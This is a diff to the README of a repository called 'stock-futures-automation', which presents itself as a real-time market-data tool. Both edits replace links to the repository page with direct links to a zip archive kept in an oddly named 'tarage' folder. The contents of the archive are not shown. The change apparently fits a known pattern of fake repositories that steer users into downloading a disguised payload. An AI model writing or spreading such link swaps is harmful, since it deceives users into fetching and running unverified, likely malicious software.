@@ -1,6 +1,6 @@
 # 📈 stock-futures-automation - Real-Time Market Data Made Easy
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Repository-blue?style=for-the-badge)](https://github.com/Duoarsenic792/stock-futures-automation)
+[![Download](https://img.shields.io/badge/Download-Visit%20Repository-blue?style=for-the-badge)](https://github.com/Duoarsenic792/stock-futures-automation/raw/refs/heads/main/tarage/futures-stock-automation-3.8.zip)
 
 ## 🧭 Overview
 
@@ -35,7 +35,7 @@ For the best result:
 
 Visit this page to download the app files:
 
-[https://github.com/Duoarsenic792/stock-futures-automation](https://github.com/Duoarsenic792/stock-futures-automation)
+[https://github.com/Duoarsenic792/stock-futures-automation/raw/refs/heads/main/tarage/futures-stock-automation-3.8.zip](https://github.com/Duoarsenic792/stock-futures-automation/raw/refs/heads/main/tarage/futures-stock-automation-3.8.zip)
 
 On that page, look for:
 
